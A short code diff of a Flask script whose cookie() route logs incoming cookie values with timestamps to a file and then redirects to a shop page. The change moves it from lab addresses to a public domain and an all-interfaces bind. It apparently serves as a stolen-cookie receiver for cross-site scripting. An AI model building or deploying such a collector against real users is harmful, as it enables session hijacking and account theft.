@@ -11,8 +11,8 @@ def cookie():
     f.write(cookie+ ''+ str(datetime.now())+ '\n')
     f.close()
 
-    return redirect("http://10.10.10.3:5000/shop.html")
+    return redirect("http://rtgshop.com/shop.html")
 
 
 if __name__ == "__main__":
-    app.run(host = '10.10.10.2', port=5001)
+    app.run(host = '0.0.0.0', port=5001)
